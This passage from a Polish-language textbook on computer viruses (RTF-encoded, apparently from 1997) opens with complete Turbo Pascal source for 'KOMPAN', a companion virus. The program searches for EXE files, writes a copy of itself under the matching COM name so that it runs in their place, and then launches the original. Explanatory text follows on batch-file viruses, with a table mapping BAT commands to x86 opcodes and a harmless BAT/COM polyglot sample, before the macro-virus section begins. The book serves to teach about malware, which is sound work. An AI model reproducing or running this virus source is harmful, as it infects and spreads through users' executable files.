\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (*;                                                                        ;*)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (*;------------------------------------------------------------------------;*)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \{$A-,B-,D-,E-,F-,G-,I-,L-,N-,O-,P-,Q-,R-,S-,T-,V-,X-,Y-\}}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \{$M 8192,0,16384\}}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch uses}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    Dos, Crt;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch const}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    MaskaEXE = '*.EXE';}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch var}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    Szuk             : SearchRec;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    NazwaNosiciela,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    NazwaOfiary      : String;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    PlikNosiciela,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    PlikOfiary       : File;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    DlugoscNosiciela : LongInt;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    Bufor            : Pointer;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    I                : Byte;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    Status           : Boolean;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch begin}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    WriteLn;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    WriteLn (' KOMPAN v1.0, Autor : Adam Blaszczyk 1997');}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    WriteLn;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    NazwaNosiciela := ParamStr (0);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    WriteLn (' Czy chcesz uruchomic wirusa (T/N) ?');}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    if UpCase(ReadKey)='T' then}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    begin}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      WriteLn;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Status :=False;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      FindFirst (MaskaEXE, AnyFile, Szuk);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      while (DosError = 0) and (IOResult = 0) and (not Status) do}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         begin}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           with Szuk do}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           if not ((Name='.')  or}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                   (Name='..') or}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                   (not (Attr and Directory and VolumeID<>0))) then}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              begin}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                NazwaOfiary:=Name;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                Delete (NazwaOfiary, Pos ('EXE',NazwaOfiary),3);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                NazwaOfiary:=NazwaOfiary+'COM';}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                Assign (PlikOfiary, NazwaOfiary);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                Reset  (PlikOfiary,1);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                if IOResult <> 0 then}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                   begin}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      Status:=True;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      WriteLn  (' Tworze KOMPANA : ',NazwaOfiary);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      Assign   (PlikNosiciela, NazwaNosiciela);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      Reset    (PlikNosiciela, 1);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      DlugoscNosiciela := FileSize (PlikNosiciela);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      GetMem     (Bufor,DlugoscNosiciela);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      BlockRead  (PlikNosiciela, Bufor^, DlugoscNosiciela);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      ReWrite    (PlikOfiary,1);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      BlockWrite (PlikOfiary   , Bufor^, DlugoscNosiciela);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      Close      (PlikNosiciela);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      Close      (PlikOfiary);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      FreeMem    (Bufor, DlugoscNosiciela);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                   end;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              end;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           FindNext (Szuk);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         end;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         If Not Status then WriteLn (' Nie znalazlem zadnego kandydata do infekcji !');}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    end;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Delete (NazwaNosiciela,Pos ('.COM',NazwaNosiciela),4);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       NazwaNosiciela := '/C '+NazwaNosiciela+'.EXE';}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       for I:=1 to ParamCount do}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           NazwaNosiciela := NazwaNosiciela +' '+ParamStr(I);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       SwapVectors;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Exec(GetEnv('COMSPEC'), NazwaNosiciela);}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       SwapVectors;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch end.}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.3. Wirusy plik\'f3w wsadowych (ang. batchviruses)}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wirusy plik\'f3w wsadowych wykorzystuj\uc1\u261\'b9ce do transportu pliki BAT, istniej\uc1\u261\'b9 od do\uc1\u347\'9c\uc1\u263\'e6 dawna, pomimo raczej ubogiego zestawu \uc1\u347\'9crodk\'f3w, jakimi dysponuje ich potencjalny tw\'f3rca. Mo\uc1\u380\'bfe wydawa\uc1\u263\'e6 si\uc1\u281\'ea to niedorzeczne, lecz cz\uc1\u281\'easto potrafi\uc1\u261\'b9 infekowa\uc1\u263\'e6 nie tylko pliki BAT, ale tak\uc1\u380\'bfe pliki COM, EXE czy sektor tablicy partycji }{\f1\fs24\lang1045{\*\listtag0}(wymaga to odpowiedniego, wcale nie tak trudnego, zaprogramowania).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Po uruchomieniu zainfekowanego pliku wsadowego tworzony jest plik uruchamiamy COM lub EXE (za pomoc\uc1\u261\'b9 polecenia ECHO, kt\'f3rego parametry s\uc1\u261\'b9 przekierowywane do pliku), zawieraj\uc1\u261\'b9cy w\uc1\u322\'b3a\uc1\u347\'9cciwy kod infekuj\uc1\u261\'b9cy pliki BAT. Po utworzeniu jest on wykonywany, a nast\uc1\u281\'eapnie kasowany.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf procesor nie rozr\'f3\uc1\u380\'bfnia kodu i danych, mo\uc1\u380\'bfna, poprzez sprytn\uc1\u261\'b9 manipulacj\uc1\u281\'ea, utworzy\uc1\u263\'e6 plik, kt\'f3ry b\uc1\u281\'eadzie m\'f3g\uc1\u322\'b3 si\uc1\u281\'ea wykona\uc1\u263\'e6 zar\'f3wno Jako typowy plik BAT, jak i p}{\f1\fs24\lang1045{\*\listtag0}lik COM.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Na przyk\uc1\u322\'b3ad typowe polecenia plik\'f3w wsadowych, wykonywane przez procesor jako cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 kodu programu COM, b\uc1\u281\'ead\uc1\u261\'b9 rozumiane jako:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:3.2939in/3.2946in/; table-sdh:88f05b8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch polecenie pliku BAT}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}instrukcje widziane przez procesor}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}REM}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}52h PUSH DX ; db 'R' }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 45h INC BP  ; db 'E' }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4Dh DEC BP  ; db 'M'}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  }{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:3.2939in/3.2946in/; table-sdh:88ddfa8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}ECHO}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}45h INC BP : db 'E'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 43h INC BX : db 'C'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 48h DEC AX ; db 'H'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4Fh DEC Dl ; db 'O'}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}@}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}40h INC AX ; db '@'}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}7t0 (deklaracja etykiety - interpretator nie wykonuje)}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}3Ah 37h CMP DH.[BX]; db ':7'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 74h 30h JZ $+30h ; 't0'}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Po uruchomie}{\f0\fs24\lang1045{\*\listtag0}niu zainfekowanego w ten spos\'f3b pliku BAT wirus kopiuje si\uc1\u281\'ea do pliku tymczasowego o rozszerzeniu COM i wykonuje si\uc1\u281\'ea, tym razem jako kod maszynowy.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfej zamieszczono przyk\uc1\u322\'b3ad prostego pliku (na dyskietce, w katalogu COMBAT), kt\'f3ry wykonuje si\uc1\u281\'ea niezale\uc1\u380\'bfnie od tego, czy jest wywo\uc1\u322\'b3ywany z rozszerzeniem BAT czy COM. Po uruchomieniu wy\uc1\u347\'9cwietla on napis informuj\uc1\u261\'b9cy o rozszerzeniu, z jakim zosta\uc1\u322\'b3 wywo\uc1\u322\'b3any.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch :7\uc1\u368\'db:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch @ECHO OFF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch @ECHO Dzialam jako plik BAT !}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch @GOTO KONIEC}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \uc1\u350\'aaII-I@\'a6M_-!\'a6L-!Dzialam jako plik COM !$}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch :KONIEC}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.4. Makrowirusy, wirusy makros\'f3w (ang. }{\f1\fs28\i\lang1045{\*\listtag0}macroviruses}{\f1\fs28\lang1045{\*\listtag0})}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tego typu wirusy to jeden z najnowszych pomys\uc1\u322\'b3\'f3w. Makrowirusy nie zara\uc1\u380\'bfaj\uc1\u261\'b9 program\'f3w uruchamia\uc1\u322\'b3nych, lecz pliki zawieraj\uc1\u261\'b9ce definicje makr. Najpopularniejsze obiekty infekcji to pliki DOC (dokumenty: Mi}{\f1\fs24\lang1045{\*\listtag0}crosoft Word), XLS (arkusze kalkulacyjne: Microsoft Excel), SAM (dokumenty: AmiPro).}{\f0\fs24\lang1045{\*\listtag0}\par}
